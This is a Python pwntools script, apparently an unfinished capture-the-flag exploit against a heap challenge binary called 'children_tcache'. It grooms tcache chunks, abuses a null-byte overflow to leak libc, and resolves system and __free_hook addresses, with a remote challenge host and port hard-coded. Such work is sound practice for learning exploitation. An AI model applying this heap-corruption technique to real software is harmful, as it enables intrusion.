from pwn import *
import sys, time

if len(sys.argv) == 1:
    p = process(["./children_tcache"])

else:
    p = remote("54.178.132.125", "8763")


context.binary = "./children_tcache"
libc = ELF("./libc.so.6")

def new(size, data):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)

def show(idx):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("Index:", str(idx))

def delete(idx):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("Index:", str(idx))

for i in xrange(8):
    new(0xf0, "a" * 0xf0)

new(0x60, "1" * 0x60)       # 8
new(0xf0, "c" * 0xf0)       # 9     ->      MAX

for i in xrange(7):
    delete(i)

new(0x10, "q" * 0x10)     # 0
delete(7)
delete(8)
new(0x68, "b" * 0x68)
for i in xrange(7):
    delete(1)
    size = 0x68 - 1 - i
    new(size, "c" * size)

delete(1)
new(0x62, "c" * 0x60 + p16(0x170))
delete(9)
delete(0)

for i in xrange(8):
    new(0xf0, "0" * 0xf0)

show(1)
leak = u64(p.recv(6) + "\x00\x00")
libc_base = leak - 0x3ebca0
__malloc_hook = libc_base + libc.symbols["__malloc_hook"]
__free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
print hex(leak)
print hex(libc_base)
print hex(system)

'''
new(0xf0, "a" * 0xf0)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)
delete(1)
new(0x60, "b" * 0x60)
for i in xrange(10):
    delete(i)

# how to overwrite ?
'''



gdb.attach(p)

p.interactive()
